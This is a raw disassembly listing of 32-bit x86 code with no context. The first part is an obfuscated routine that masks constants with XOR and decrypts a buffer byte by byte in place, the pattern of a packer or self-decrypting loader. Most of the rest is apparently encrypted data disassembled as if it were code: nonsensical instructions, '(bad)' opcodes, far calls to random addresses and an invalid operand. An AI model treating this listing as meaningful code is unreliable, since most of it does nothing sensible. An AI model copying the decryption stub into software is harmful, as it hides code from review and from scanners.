  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
  41123a:	mov    DWORD PTR [ebp-0x40],0xf89c85b4
  411241:	mov    DWORD PTR [ebp-0x30],0xf89c85bb
  411248:	mov    DWORD PTR [ebp-0x1c],eax
  41124b:	mov    eax,DWORD PTR [ebp-0x20]
  41124e:	xor    eax,esi
  411250:	add    eax,edi
  411252:	jmp    0x4136e4
  411257:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41125e:	mov    eax,DWORD PTR [ebp-0x1c]
  411261:	mov    edx,DWORD PTR [ebp-0xc]
  411264:	xor    eax,esi
  411266:	add    eax,edi
  411268:	imul   eax,edx
  41126b:	mov    edx,DWORD PTR [ebp-0x8]
  41126e:	mov    al,BYTE PTR [eax+edx*1]
  411271:	mov    BYTE PTR [ebp-0x1],al
  411274:	mov    eax,DWORD PTR [ebp-0x1c]
  411277:	mov    edx,DWORD PTR [ebp-0xc]
  41127a:	xor    eax,esi
  41127c:	add    eax,edi
  41127e:	imul   eax,edx
  411281:	mov    edx,DWORD PTR [ebp-0x40]
  411284:	xor    edx,esi
  411286:	add    eax,edx
  411288:	mov    edx,DWORD PTR [ebp-0x8]
  41128b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  411293:	mov    edx,DWORD PTR [ebp-0x48]
  411296:	xor    edx,esi
  411298:	lea    eax,[edx+eax*1+0x3272db]
  41129f:	movzx  edx,BYTE PTR [ebp-0x1]
  4112a3:	xor    edx,eax
  4112a5:	mov    BYTE PTR [ebp-0x1],dl
  4112a8:	mov    al,BYTE PTR [ebp-0x1]
  4112ab:	mov    edx,DWORD PTR [ebp-0x1c]
  4112ae:	mov    ebx,DWORD PTR [ebp-0xc]
  4112b1:	xor    edx,esi
  4112b3:	add    edx,edi
  4112b5:	imul   edx,ebx
  4112b8:	mov    ebx,DWORD PTR [ebp-0x8]
  4112bb:	mov    BYTE PTR [edx+ebx*1],al
  4112be:	mov    eax,DWORD PTR [ebp-0x1c]
  4112c1:	mov    edx,DWORD PTR [ebp-0xc]
  4112c4:	xor    eax,esi
  4112c6:	add    eax,edi
  4112c8:	imul   eax,edx
  4112cb:	mov    edx,DWORD PTR [ebp-0x8]
  4112ce:	mov    al,BYTE PTR [eax+edx*1]
  4112d1:	mov    BYTE PTR [ebp-0x1],al
  4112d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4112d7:	mov    edx,DWORD PTR [ebp-0xc]
  4112da:	xor    eax,esi
  4112dc:	add    eax,edi
  4112de:	imul   eax,edx
  4112e1:	mov    edx,DWORD PTR [ebp-0x3c]
  4112e4:	xor    edx,esi
  4112e6:	add    eax,edx
  4112e8:	mov    edx,DWORD PTR [ebp-0x8]
  4112eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  4112f3:	mov    edx,DWORD PTR [ebp-0x54]
  4112f6:	xor    edx,esi
  4112f8:	lea    eax,[edx+eax*1+0x3272db]
  4112ff:	movzx  edx,BYTE PTR [ebp-0x1]
  411303:	xor    edx,eax
  411305:	mov    BYTE PTR [ebp-0x1],dl
  411308:	mov    al,BYTE PTR [ebp-0x1]
  41130b:	mov    edx,DWORD PTR [ebp-0x1c]
  41130e:	jmp    0x4136c0
  411313:	cli    
  411314:	jl     0x411300
  411316:	popa   
  411317:	fs jecxz 0x411383
  41131a:	repz push eax
  41131c:	push   esp
  41131d:	and    eax,0x58278fd3
  411322:	mov    dl,BYTE PTR [edi-0x72]
  411325:	bound  esp,QWORD PTR [edx-0x33]
  411328:	pop    edi
  411329:	bound  esp,QWORD PTR [edx+0x42]
  41132c:	out    dx,eax
  41132d:	cmp    DWORD PTR [esi],eax
  41132f:	push   eax
  411330:	mov    cl,0x89
  411332:	inc    edi
  411333:	gs ins DWORD PTR es:[edi],dx
  411335:	push   esp
  411336:	mov    ch,0xc9
  411338:	retf   
  411339:	inc    edi
  41133a:	mov    ch,0xf6
  41133c:	pop    edx
  41133d:	sbb    al,0xf2
  41133f:	cmp    al,0x1a
  411341:	in     al,0x9
  411343:	popf   
  411344:	(bad)  
  411345:	sti    
  411346:	mov    al,ds:0x990fbdb3
  41134b:	push   esp
  41134c:	push   0x937f32de
  411351:	or     eax,DWORD PTR [edx+0x5748f9ee]
  411357:	jl     0x41133c
  411359:	(bad)  
  41135a:	mov    bl,0xa5
  41135c:	fcmovbe st,st(5)
  41135e:	jl     0x41135f
  411360:	pop    ss
  411361:	fsubr  st(1),st
  411363:	nop
  411364:	bound  ebp,QWORD PTR [edx]
  411366:	test   eax,0xd88f0a4f
  41136b:	dec    esi
  41136c:	lahf   
  41136d:	mov    ch,0x42
  41136f:	das    
  411370:	push   es
  411371:	jnp    0x411379
  411373:	jnp    0x4113cc
  411375:	pop    ecx
  411376:	push   ds
  411377:	test   bl,bl
  411379:	gs pop ebx
  41137b:	adc    DWORD PTR [ebx+0x34],ebx
  41137e:	xor    al,0x1a
  411380:	out    dx,eax
  411381:	xchg   ebx,eax
  411382:	lea    ecx,[edx+0x60]
  411385:	aam    0x40
  411387:	xor    eax,0x2af81243
  41138c:	pop    esp
  41138d:	jge    0x4113b4
  41138f:	imul   ebp,DWORD PTR [eax],0xdb0e8d6b
  411395:	stc    
  411396:	sub    bl,dl
  411398:	push   edi
  411399:	loope  0x4113eb
  41139b:	js     0x411335
  41139d:	pushf  
  41139e:	inc    dl
  4113a0:	bound  esi,QWORD PTR [edi]
  4113a2:	sub    al,0x49
  4113a4:	mov    eax,ds:0xf9c4531b
  4113a9:	mov    bl,0xb2
  4113ab:	add    BYTE PTR [eax-0x60e99f94],cl
  4113b1:	add    DWORD PTR [edx],esi
  4113b3:	and    cl,BYTE PTR [esi+eax*1+0x74]
  4113b7:	pushw  0x8878
  4113bb:	test   BYTE PTR [edx-0xc76cecf],cl
  4113c1:	imul   eax,DWORD PTR [edi+0x64],0x4e439e73
  4113c8:	xchg   edi,eax
  4113c9:	xor    al,0x16
  4113cb:	loopne 0x411374
  4113cd:	mov    ah,0x69
  4113cf:	popa   
  4113d0:	mov    bl,0xac
  4113d2:	and    BYTE PTR ss:[ecx],bl
  4113d5:	popa   
  4113d6:	mov    DWORD PTR [ebp-0x553f4bfb],ecx
  4113dc:	aad    0xb
  4113de:	dec    edi
  4113df:	les    esp,FWORD PTR [ecx+0x42]
  4113e2:	cdq    
  4113e3:	leave  
  4113e4:	xchg   esi,eax
  4113e5:	dec    ebp
  4113e6:	jecxz  0x4113ac
  4113e8:	sub    ah,ah
  4113ea:	jne    0x4113c8
  4113ec:	inc    edi
  4113ed:	sbb    eax,0xaec8e79f
  4113f2:	or     eax,DWORD PTR ds:0x79b793cb
  4113f8:	iret   
  4113f9:	mov    WORD PTR [ecx+0xd],?
  4113fc:	js     0x411430
  4113fe:	(bad)  
  4113ff:	mov    edi,0xa79aa06
  411404:	jl     0x411456
  411406:	push   edi
  411407:	mov    dh,0x33
  411409:	sub    al,0x5b
  41140b:	xchg   edx,eax
  41140c:	or     BYTE PTR [ebp+0x21],cl
  41140f:	enter  0x5394,0x34
  411413:	jae    0x4113ac
  411415:	loop   0x411482
  411417:	dec    ebp
  411418:	cmp    esi,eax
  41141a:	retf   0x3a83
  41141d:	enter  0x6fea,0x7a
  411421:	sbb    DWORD PTR [ebx-0x4548bd49],esi
  411427:	add    DWORD PTR [ebx+0x7a],edx
  41142a:	add    ch,BYTE PTR [edx-0x2cfd4075]
  411430:	rcl    BYTE PTR [ecx-0x12],cl
  411433:	mov    esi,0x442b090d
  411438:	jmp    0xeebfb94a
  41143d:	pop    esi
  41143e:	push   ebp
  41143f:	icebp  
  411440:	lods   eax,DWORD PTR ds:[esi]
  411441:	push   0x64
  411443:	fist   WORD PTR [edx+0x345d1015]
  411449:	push   ebp
  41144a:	push   0xd
  41144c:	fdivr  QWORD PTR [ebx]
  41144e:	sbb    edx,0x69
  411451:	stos   BYTE PTR es:[edi],al
  411452:	xlat   BYTE PTR ds:[ebx]
  411453:	sahf   
  411454:	or     eax,0x49c6b860
  411459:	inc    ebp
  41145a:	push   ss
  41145b:	lea    ebp,[edi]
  41145d:	hlt    
  41145e:	add    al,0x8
  411460:	addr16 xor eax,0xce9f6285
  411466:	sbb    al,0x6f
  411468:	pop    ss
  411469:	fs dec ebx
  41146b:	and    BYTE PTR [ecx],bl
  41146d:	mov    cl,0x95
  41146f:	mov    eax,gs
  411471:	xchg   DWORD PTR [edi-0x62],ecx
  411474:	pop    ebp
  411475:	adc    BYTE PTR [ebp-0x43],ch
  411478:	inc    BYTE PTR [eax-0x6ff3ab2f]
  41147e:	addr16 jp 0x41142c
  411481:	dec    BYTE PTR [ecx]
  411483:	mov    WORD PTR [esi],gs
  411485:	leave  
  411486:	jg     0x4114ae
  411488:	jbe    0x41144b
  41148a:	addr16 je 0x411482
  41148d:	sbb    ecx,esi
  41148f:	mov    dl,0xaf
  411491:	push   eax
  411492:	adc    esi,esi
  411494:	in     eax,0x39
  411496:	(bad)  
  411497:	es aam 0x4
  41149a:	hlt    
  41149b:	iret   
  41149c:	mov    ebx,0xedb7b2aa
  4114a1:	repz adc bh,ah
  4114a4:	pop    esp
  4114a5:	les    ebx,FWORD PTR [ecx-0x429a82c9]
  4114ab:	pop    esi
  4114ac:	inc    ebp
  4114ad:	or     esp,DWORD PTR [esi+edi*8-0x4d]
  4114b1:	mov    ecx,0xa6dfbee3
  4114b6:	adc    ebp,ebx
  4114b8:	pop    ebp
  4114b9:	mov    esi,0x893b36fb
  4114be:	inc    eax
  4114bf:	imul   esp,DWORD PTR [edi],0x2bf661f9
  4114c5:	and    ecx,DWORD PTR [esp+eiz*8-0x48]
  4114c9:	cli    
  4114ca:	jge    0x411461
  4114cc:	imul   ecx,DWORD PTR [ebp+0x2f],0xfffffff0
  4114d0:	mov    edi,0xb4800221
  4114d5:	push   ss
  4114d6:	sbb    cl,BYTE PTR ss:[eax-0x4b]
  4114da:	daa    
  4114db:	mov    gs,WORD PTR [edx]
  4114dd:	dec    edi
  4114de:	xor    BYTE PTR [ebp+0x5e8c2c58],0x77
  4114e5:	push   ebx
  4114e6:	or     ah,BYTE PTR [eax]
  4114e8:	int    0xc0
  4114ea:	js     0x411547
  4114ec:	sub    al,0x79
  4114ee:	sahf   
  4114ef:	jno    0x411482
  4114f1:	in     eax,dx
  4114f2:	outs   dx,BYTE PTR ds:[esi]
  4114f3:	popf   
  4114f4:	dec    esp
  4114f5:	jb     0x4114e0
  4114f7:	lahf   
  4114f8:	mov    ah,0x62
  4114fa:	int    0x6c
  4114fc:	push   0xaeca6dc5
  411501:	mov    dh,BYTE PTR [ebx]
  411503:	add    BYTE PTR [ecx+ebp*2+0x9],dh
  411507:	push   ss
  411508:	aaa    
  411509:	pop    ebx
  41150a:	mov    esp,0x14b8e692
  41150f:	icebp  
  411510:	std    
  411511:	sub    eax,0x1f89f1cb
  411516:	jmp    0x411532
  411518:	mov    ds:0x5a91645a,al
  41151d:	aas    
  41151e:	jne    0x411566
  411520:	jbe    0x4114d0
  411522:	jb     0x4114d3
  411524:	imul   esi,DWORD PTR [edx+0x650ba478],0x40
  41152b:	push   es
  41152c:	sbb    eax,0x849f6cd0
  411531:	popf   
  411532:	xor    ebp,DWORD PTR [ecx]
  411534:	bound  edx,QWORD PTR ds:0xba140f9f
  41153a:	cmp    ebx,ecx
  41153c:	call   0xca0d65d5
  411541:	(bad)  
  411542:	test   al,0x90
  411544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411545:	mov    dl,0x6a
  411547:	cmp    eax,0xe2ff3203
  41154c:	es pop esi
  41154e:	cmp    ch,BYTE PTR [esi+0x67]
  411551:	shr    dl,cl
  411553:	dec    ebx
  411554:	jno    0x41153a
  411556:	pop    eax
  411557:	sbb    ch,BYTE PTR [ecx-0xe]
  41155a:	stos   DWORD PTR es:[edi],eax
  41155b:	mov    ecx,0xffa4569f
  411560:	(bad)  
  411561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411562:	dec    eax
  411563:	fidiv  WORD PTR [edi]
  411565:	shl    DWORD PTR [esp+ecx*1],cl
  411568:	fsub   QWORD PTR [eax-0x66e1eb12]
  41156e:	gs adc eax,0xfbd99c14
  411574:	xor    dh,al
  411576:	cmp    eax,0x97e46b27
  41157b:	sub    BYTE PTR [edx+0x14eae3fd],0xaf
  411582:	imul   BYTE PTR fs:[edx+edx*8]
  411586:	sub    DWORD PTR cs:[ecx],esi
  411589:	add    al,0x2e
  41158b:	cmp    dh,BYTE PTR [ecx+0x669d2de2]
  411591:	mov    ebx,0xdb5fdedd
  411596:	out    dx,eax
  411597:	jl     0x4115ff
  411599:	js     0x411591
  41159b:	pop    ds
  41159c:	cmp    eax,0xfec83db
  4115a1:	mov    fs,WORD PTR [eax-0x73]
  4115a4:	in     eax,dx
  4115a5:	add    esi,esi
  4115a7:	inc    esi
  4115a8:	dec    ecx
  4115a9:	retf   0xdc48
  4115ac:	xor    eax,0x31e51fe0
  4115b1:	(bad)  
  4115b2:	shl    DWORD PTR [ebx+0x2e7ff2bd],0xfd
  4115b9:	mov    ah,0x85
  4115bb:	pop    es
  4115bc:	shl    BYTE PTR [esi+0x5ec331d7],1
  4115c2:	add    BYTE PTR [ebx-0x79],cl
  4115c5:	test   eax,0xf58f729f
  4115ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115cb:	test   edx,0x3d310893
  4115d1:	(bad)  
  4115d2:	mov    bl,0xec
  4115d4:	sub    DWORD PTR [edx+0x11d06d6e],esp
  4115da:	out    0x97,eax
  4115dc:	je     0x411630
  4115de:	xor    al,al
  4115e0:	dec    edi
  4115e1:	cmp    BYTE PTR [edi-0xd],dl
  4115e4:	scas   al,BYTE PTR es:[edi]
  4115e5:	(bad)  
  4115e6:	cld    
  4115e7:	push   eax
  4115e8:	(bad)  
  4115e9:	repz add esi,eax
  4115ec:	xchg   edi,eax
  4115ed:	lods   al,BYTE PTR ds:[esi]
  4115ee:	adc    BYTE PTR [edi+0x9b1415],bh
  4115f4:	push   ss
  4115f5:	push   0xffffffe8
  4115f7:	test   DWORD PTR [ebp-0x45],edi
  4115fa:	popf   
  4115fb:	inc    cl
  4115fd:	xchg   esi,eax
  4115fe:	xchg   ebx,esp
  411600:	stc    
  411601:	pusha  
  411602:	cmp    dh,0x9b
  411605:	add    bl,BYTE PTR [edi-0x1e80b3aa]
  41160b:	xor    DWORD PTR [esi-0x7d3c0ce4],edx
  411611:	ror    BYTE PTR [ebp-0x54],cl
  411614:	mov    dh,0xa3
  411616:	mov    ch,0x49
  411618:	sub    DWORD PTR [edi-0x16fbb761],edi
  41161e:	lahf   
  41161f:	mov    ebp,0xfc2a3d5b
  411624:	or     DWORD PTR [ecx],esp
  411626:	push   es
  411627:	push   esi
  411628:	pop    eax
  411629:	scas   eax,DWORD PTR es:[edi]
  41162a:	xchg   esp,eax
  41162b:	or     BYTE PTR [edi+0x58],dl
  41162e:	loop   0x411665
  411630:	(bad)  
  411631:	mov    ds:0xbae6ccf9,eax
  411636:	push   ss
  411637:	aam    0xa6
  411639:	mov    al,ds:0x2fdfd451
  41163e:	ins    DWORD PTR es:[edi],dx
  41163f:	js     0x4115c3
  411641:	inc    edx
  411642:	cmp    BYTE PTR [eax+0xb997c3e],bh
  411648:	sbb    ch,BYTE PTR [ecx-0xa]
  41164b:	pop    ebx
  41164c:	push   ss
  41164d:	dec    ebx
  41164e:	add    edx,DWORD PTR [edi]
  411650:	imul   edi,DWORD PTR [ebx+0xc],0xffffff88
  411654:	bound  ebx,QWORD PTR [edx]
  411656:	and    al,0x9a
  411658:	imul   ebx,DWORD PTR [eax-0x3],0xffffff9c
  41165c:	cmovbe ebp,esi
  41165f:	hlt    
  411660:	scas   eax,DWORD PTR es:[edi]
  411661:	cmp    ebp,edx
  411663:	add    al,0xba
  411665:	pop    esi
  411666:	daa    
  411667:	loope  0x4116c1
  411669:	cmp    eax,0xf49bbf84
  41166e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166f:	mov    eax,0x529d6b19
  411674:	jae    0x41165d
  411676:	pushf  
  411677:	jmp    0xf592947a
  41167c:	aas    
  41167d:	cmp    BYTE PTR [edx],0x4d
  411680:	fldcw  WORD PTR [edi+edx*2+0x53f35968]
  411687:	fistp  WORD PTR [edi+0x7e]
  41168a:	pusha  
  41168b:	pop    es
  41168c:	xor    al,0x71
  41168e:	jnp    0x4116f0
  411690:	sub    eax,0xc31efb2
  411695:	sahf   
  411696:	cmp    ebx,edx
  411698:	aam    0x3e
  41169a:	imul   ebx,ecx,0x32
  41169d:	jmp    0x411678
  41169f:	shl    DWORD PTR [eax],cl
  4116a1:	adc    al,0xe8
  4116a3:	mov    dl,0x0
  4116a5:	ret    
  4116a6:	dec    esi
  4116a7:	mov    ebp,DWORD PTR [edx]
  4116a9:	gs aaa 
  4116ab:	jecxz  0x411670
  4116ad:	retf   
  4116ae:	sbb    al,0x20
  4116b0:	iret   
  4116b1:	lock repnz rcl BYTE PTR [edi+0x7daee263],cl
  4116b9:	int    0x39
  4116bb:	(bad)  
  4116bd:	test   BYTE PTR [ebp+ebp*8+0x2d41cb2f],al
  4116c4:	mov    ebx,0x7f12dc3
  4116c9:	mov    ss,WORD PTR ss:[esi]
  4116cc:	mov    BYTE PTR [ebp+0x729beeb3],dh
  4116d2:	and    ah,BYTE PTR [ebx-0x54f95ff0]
  4116d8:	ins    BYTE PTR es:[edi],dx
  4116d9:	sub    BYTE PTR [esi+ebp*1-0x23905709],0xf3
  4116e1:	push   ebp
  4116e2:	mov    ds:0x127b6742,al
  4116e7:	into   
  4116e8:	and    al,0x31
  4116ea:	xchg   esi,eax
  4116eb:	push   ds
  4116ec:	mov    esi,DWORD PTR [eax-0x79]
  4116ef:	call   0x97d:0x6163b659
  4116f6:	mov    ss:0xa567225d,eax
  4116fc:	repz aad 0x42
  4116ff:	inc    ecx
  411700:	adc    al,0x76
  411702:	inc    edi
  411703:	mov    bl,0x8a
  411705:	(bad)  
  411706:	lods   eax,DWORD PTR ds:[esi]
  411707:	pop    edx
  411708:	pusha  
  411709:	paddusb mm4,QWORD PTR [ebp+0x7b3f19a8]
  411710:	std    
  411711:	add    DWORD PTR [ebp+0x55b10e7d],esi
  411717:	pop    edx
  411718:	push   ebp
  411719:	pushf  
  41171a:	popa   
  41171b:	clc    
  41171c:	scas   al,BYTE PTR es:[edi]
  41171d:	sti    
  41171e:	cmp    bh,dh
  411720:	shl    DWORD PTR [esi-0x24],cl
  411723:	lods   al,BYTE PTR ds:[esi]
  411724:	loop   0x411709
  411726:	aam    0xd2
  411728:	scas   eax,DWORD PTR es:[edi]
  411729:	ret    0x1dcd
  41172c:	or     ch,BYTE PTR [esi+ebx*1]
  41172f:	cmp    BYTE PTR [esi+0x71],al
  411732:	pop    esi
  411733:	and    eax,0x60dcd37b
  411738:	sub    ah,BYTE PTR [edx-0x5f]
  41173b:	sub    eax,0xa8adf636
  411740:	jne    0x411757
  411742:	dec    ecx
  411743:	pop    es
  411744:	ins    BYTE PTR es:[edi],dx
  411745:	dec    ecx
  411746:	das    
  411747:	inc    ecx
  411748:	push   cs
  411749:	or     eax,0x461db0f7
  41174e:	test   eax,0xc7e3e6f7
  411753:	cwde   
  411754:	jecxz  0x41177c
  411756:	jle    0x4117ba
  411758:	test   DWORD PTR [ebp-0x6e3a4e6],esi
  41175e:	cmp    al,0x99
  411760:	fstp   QWORD PTR [esi-0x15]
  411763:	jmp    0x4117ad
  411765:	cdq    
  411766:	test   edx,ecx
  411768:	xchg   BYTE PTR [ebp+edi*4+0x39],dl
  41176c:	retf   0x989
  41176f:	xor    al,0x98
  411771:	and    BYTE PTR [esi-0x66d6915d],al
  411777:	adc    al,0x41
  411779:	clc    
  41177a:	mov    DWORD PTR [ecx+esi*4+0x42586c6a],ebx
  411781:	sahf   
  411782:	(bad)  [edi+0x7aa6ca23]
  411788:	xchg   dh,bh
  41178a:	pmullw mm4,QWORD PTR [edx]
  41178d:	mul    bh
  41178f:	and    ah,cl
  411791:	rcl    BYTE PTR [ecx+0x70],cl
  411794:	call   0xca96:0xe0522fe9
  41179b:	dec    esi
  41179c:	call   0x628381ec
  4117a1:	mov    ah,0xda
  4117a3:	inc    edx
  4117a4:	test   ah,bh
  4117a6:	nop
  4117a7:	iret   
  4117a8:	mov    esi,0x273dd40a
  4117ad:	jg     0x4117cc
  4117af:	or     ah,BYTE PTR [ebx]
  4117b1:	push   0x94459b6c
  4117b6:	cmp    DWORD PTR [edi-0x782a7445],ecx
  4117bc:	icebp  
  4117bd:	adc    al,0x66
  4117bf:	jnp    0x4117bf
  4117c1:	pop    esi
  4117c2:	lds    ebx,FWORD PTR [edx-0x706d2493]
  4117c8:	test   DWORD PTR [eax+0x1d],edi
  4117cb:	scas   eax,DWORD PTR es:[edi]
  4117cc:	cmp    eax,0xd75be406
  4117d1:	(bad)  
  4117d2:	aad    0xec
  4117d4:	test   BYTE PTR [edx+0x10],ah
  4117d7:	nop
  4117d8:	adc    DWORD PTR [ebx],ebx
  4117da:	push   0x4b
  4117dc:	jb     0x4117ac
  4117de:	push   ds
  4117df:	imul   ebp,ebx,0x1c
  4117e2:	sub    eax,0xb94f427
  4117e7:	pop    edx
  4117e8:	xchg   edi,eax
  4117e9:	stos   DWORD PTR es:[edi],eax
  4117ea:	mov    dl,ah
  4117ec:	mov    BYTE PTR [bx+di],bl
  4117ef:	inc    ecx
  4117f0:	xchg   ebp,eax
  4117f1:	sbb    al,0x11
  4117f3:	ret    
  4117f4:	je     0x4117e7
  4117f6:	xchg   esi,eax
  4117f7:	jmp    0x2355f2fe
  4117fc:	ss outs dx,DWORD PTR es:[esi]
  4117ff:	adc    cl,ah
  411801:	in     eax,dx
  411802:	push   ecx
  411803:	jno    0x4117c2
  411805:	or     DWORD PTR [ebx],edx
  411807:	push   edi
  411808:	fistp  QWORD PTR [ebp+0x1f]
  41180b:	mov    BYTE PTR [edx-0x8fd626],al
  411811:	cmp    al,0x40
  411813:	popf   
  411814:	sbb    eax,0x87980a01
  411819:	iret   
  41181a:	cdq    
  41181b:	(bad)  
  41181c:	push   esi
  41181d:	xor    eax,0x47e6346e
  411822:	and    eax,DWORD PTR [ebx]
  411824:	nop
  411825:	xor    eax,0x3efa4983
  41182a:	dec    edx
  41182b:	inc    ecx
  41182c:	cmp    bh,BYTE PTR [edx]
  41182e:	or     edx,DWORD PTR ss:[ebp-0x7a9cf667]
  411835:	nop
  411836:	fcmovnbe st,st(3)
  411838:	push   esi
  411839:	rol    BYTE PTR [ecx],cl
  41183b:	and    al,BYTE PTR [edx-0x717ed3aa]
  411841:	mov    DWORD PTR [edx-0x7d],eax
  411844:	rol    BYTE PTR [ebp-0xe],0x4b
  411848:	jmp    0x58ffb787
  41184d:	je     0x41182f
  41184f:	stos   BYTE PTR es:[edi],al
  411850:	out    0xcb,al
  411852:	mov    al,ds:0x735d7683
  411857:	add    cl,BYTE PTR [ecx-0x79]
  41185a:	push   ecx
  41185b:	mov    al,0x51
  41185d:	dec    ebx
  41185e:	xchg   esp,eax
  41185f:	or     ebp,DWORD PTR [esi-0x8]
  411862:	ins    DWORD PTR es:[edi],dx
  411863:	out    0xe9,al
  411865:	test   eax,0x239d4d9e
  41186a:	sahf   
  41186b:	xor    eax,0xbe669cc9
  411870:	and    DWORD PTR [esi],0xffffffed
  411873:	bnd jns 0x41188e
  411876:	jge    0x41187b
  411878:	push   ds
  411879:	add    DWORD PTR [esp+ebp*8-0x7165337d],0xef44c435
  411884:	out    dx,eax
  411885:	dec    eax
  411886:	mov    cl,0xa
  411888:	xor    esi,esp
  41188a:	jp     0x41186c
  41188c:	repz adc DWORD PTR [ebx],esp
  41188f:	or     DWORD PTR [eax-0x66],ecx
  411892:	lods   eax,DWORD PTR ds:[esi]
  411893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411894:	cld    
  411895:	xchg   ebp,eax
  411896:	mov    bl,0x60
  411898:	inc    eax
  411899:	imul   edi,edx,0x5
  41189c:	adc    DWORD PTR [ecx+0x71b5fa94],edi
  4118a2:	xchg   esp,eax
  4118a3:	cwde   
  4118a4:	jg     0x41190b
  4118a6:	push   ecx
  4118a7:	rol    BYTE PTR [esi-0x47],cl
  4118aa:	sbb    al,0xa2
  4118ac:	scas   al,BYTE PTR es:[edi]
  4118ad:	repz xchg ecx,eax
  4118af:	fsub   QWORD PTR [esp+eiz*8-0x13]
  4118b3:	nop
  4118b4:	lods   al,BYTE PTR ds:[esi]
  4118b5:	sub    BYTE PTR [edx],dh
  4118b7:	mov    dl,0xc
  4118b9:	leave  
  4118ba:	loop   0x41191e
  4118bc:	xchg   esi,eax
  4118bd:	jecxz  0x411891
  4118bf:	and    ch,BYTE PTR [ecx-0x7ca4ecc6]
  4118c5:	or     BYTE PTR [edx+ebx*4],ah
  4118c8:	push   edx
  4118c9:	or     DWORD PTR [ebx],0xfdfe8f19
  4118cf:	test   al,0x25
  4118d1:	lock adc ah,BYTE PTR [edx-0x4ebe382c]
  4118d8:	adc    eax,0xb1dab84d
  4118dd:	xor    BYTE PTR [edi+0x47],0x5c
  4118e1:	jmp    0x69df:0x562008bb
  4118e8:	sub    BYTE PTR [ecx-0x4f],bh
  4118eb:	mov    ebx,0xc9e4f18c
  4118f0:	push   edx
  4118f1:	pop    ebx
  4118f2:	jecxz  0x41192c
  4118f4:	test   eax,0x6895b29b
  4118f9:	dec    edi
  4118fa:	daa    
  4118fb:	popf   
  4118fc:	xlat   BYTE PTR ss:[ebx]
  4118fe:	call   0xb19f:0x10251de
  411905:	xlat   BYTE PTR ds:[ebx]
  411906:	lahf   
  411907:	add    eax,0xe0e92887
  41190c:	or     DWORD PTR [ebx-0x79],esi
  41190f:	jno    0x411937
  411911:	jmp    0xc2c1b89e
  411916:	sub    eax,DWORD PTR [ecx+0x67f0732b]
  41191c:	in     al,dx
  41191d:	and    eax,0xe1bf0704
  411923:	ins    DWORD PTR es:[edi],dx
  411924:	mov    ds:0x637f646,eax
  411929:	inc    edi
  41192a:	cmp    BYTE PTR [ecx+esi*8],cl
  41192d:	adc    eax,ebx
  41192f:	jnp    0x411984
  411931:	mov    ds:0xfa9990c7,eax
  411936:	ret    
  411937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411938:	push   ss
  411939:	arpl   WORD PTR [edx+edx*2],bp
  41193c:	pop    esi
  41193d:	jecxz  0x41190b
  41193f:	xchg   esp,eax
  411940:	(bad)  
  411941:	push   0x7d076aba
  411946:	iret   
  411947:	ins    BYTE PTR es:[edi],dx
  411948:	iret   
  411949:	inc    esi
  41194a:	ret    
  41194b:	nop    DWORD PTR [eax]
  41194e:	inc    ecx
  41194f:	outs   dx,DWORD PTR ds:[esi]
  411950:	mov    ebp,0x8353521b
  411955:	xchg   cl,al
  411957:	imul   cl
  411959:	and    al,0x0
  41195b:	neg    dl
  41195d:	jmp    0x411943
  41195f:	jmp    0x99f2547b
  411964:	xchg   edx,eax
  411965:	ret    0x7678
  411968:	stc    
  411969:	and    DWORD PTR [ecx+edi*8],ebx
  41196c:	cli    
  41196d:	pusha  
  41196e:	out    dx,eax
  41196f:	push   ecx
  411970:	xchg   edi,eax
  411971:	out    0xaa,eax
  411973:	test   BYTE PTR [edi+0x7b2d124b],bl
  411979:	mov    dh,0xf8
  41197b:	adc    DWORD PTR [eax+0x770e830d],ebp
  411981:	push   ebp
  411982:	jmp    0xa345:0x76e325e4
  411989:	(bad)
  41198c:	mov    esi,DWORD PTR [esi-0x62b9d791]
  411992:	imul   ebx,DWORD PTR [ebx+0x550fe5f6],0xe3d1fb5e
  41199c:	or     eax,0x99e27c4b
  4119a1:	cmpxchg DWORD PTR [eax+0x11],esi
  4119a5:	stos   DWORD PTR es:[edi],eax
  4119a6:	or     al,0x6b
  4119a8:	int    0xfe
  4119aa:	std    
  4119ab:	xor    cl,cl
  4119ad:	mov    ebp,0x105d293d
  4119b2:	inc    ecx
  4119b3:	out    dx,al
  4119b4:	scas   eax,DWORD PTR es:[edi]
  4119b5:	mov    ch,0x10
  4119b7:	ficomp WORD PTR [ecx]
  4119b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ba:	ja     0x411996
  4119bc:	(bad)  
  4119bd:	jmp    0x411a07
  4119bf:	sub    eax,0x21e85dbc
  4119c4:	mov    al,ds:0x7513bc5c
  4119c9:	retf   0xe34c
  4119cc:	and    DWORD PTR [edx-0x6374fe5c],esp
  4119d2:	aaa    
  4119d3:	mov    ebp,DWORD PTR ds:0xd40105ab
  4119d9:	jl     0x411963
  4119db:	aam    0x97
  4119dd:	mov    eax,ds:0x48098892
  4119e2:	dec    edi
  4119e3:	jne    0x411a4e
  4119e5:	xlat   BYTE PTR ds:[ebx]
  4119e6:	push   ebx
  4119e7:	xchg   esp,eax
  4119e8:	sbb    edx,DWORD PTR [edx+0x28]
  4119eb:	into   
  4119ec:	jge    0x4119ed
  4119ee:	adc    al,0x6e
  4119f0:	inc    eax
  4119f1:	iret   
  4119f2:	ret    0xbbfa
  4119f5:	jmp    0x411998
  4119f7:	mov    bl,0x85
  4119f9:	push   es
  4119fa:	pop    esi
  4119fb:	sti    
  4119fc:	jae    0x411a54
  4119fe:	mov    dh,0xfe
  411a00:	add    al,0xf3
  411a02:	xchg   esp,eax
  411a03:	inc    esp
  411a04:	pop    es
  411a05:	sbb    al,0xf0
  411a07:	adc    bl,BYTE PTR [eax+0x6e]
  411a0a:	sub    ebp,DWORD PTR [ecx+ebx*2]
  411a0d:	daa    
  411a0e:	pop    edi
  411a0f:	ja     0x4119ee
  411a11:	mov    esp,esi
  411a13:	jb     0x4119b7
